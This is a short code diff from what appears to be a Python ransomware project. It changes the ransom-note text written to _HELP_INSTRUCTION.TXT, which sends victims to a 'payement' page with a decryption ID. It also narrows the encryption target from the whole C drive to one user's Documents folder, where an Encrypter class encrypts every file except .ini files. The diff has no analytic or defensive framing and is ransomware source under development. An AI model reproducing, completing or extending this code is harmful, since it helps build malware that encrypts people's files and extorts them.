@@ -30,7 +30,7 @@ def help_text(uuid : str):
         '1. Run your browser and wait for initialization. \n',
         '2. Type in the address bar : http://127.0.0.1:8000/payement \n',
         '3. Follow the instructions on the site. \n'    
-        '!!! Your DECRYTP-ID : ' + uuid
+        f'!!! Your DECRYTP-ID : {uuid}',
         ]
     file = open('_HELP_INSTRUCTION.TXT', '+w')
     for t in range(len(help_text)):
@@ -47,7 +47,7 @@ def main():
     encryption_key = KeyGenerator().generateKey()
     crypter = Encrypter(encryption_key)
 
-    path = "C://"
+    path = "C://Users//larsko//Documents"
     excludeExtensions = (".ini")
     encrypted_files = crypter.encrypt(path, excludeExtensions)
 
